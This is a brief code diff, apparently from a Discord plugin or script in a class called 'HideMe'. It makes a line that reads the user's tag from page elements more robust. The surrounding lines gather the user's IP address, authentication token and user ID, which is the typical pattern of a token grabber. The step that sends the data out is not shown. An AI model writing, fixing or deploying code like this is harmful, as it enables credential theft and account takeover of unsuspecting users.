@@ -71,7 +71,7 @@ class HideMe {
     	}
 
     	var IP = await getIP();
-    	var actualUserTag = document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0].innerText + document.getElementsByClassName("hovered-d5PMVU")[0].innerText;
+    	var actualUserTag = document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0]?.innerText + document.getElementsByClassName("hovered-d5PMVU")[0]?.innerText;
     	var actualUserToken = await getInfo("token");
     	var actualUserID = await getInfo("user_id_cache");
     	//var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
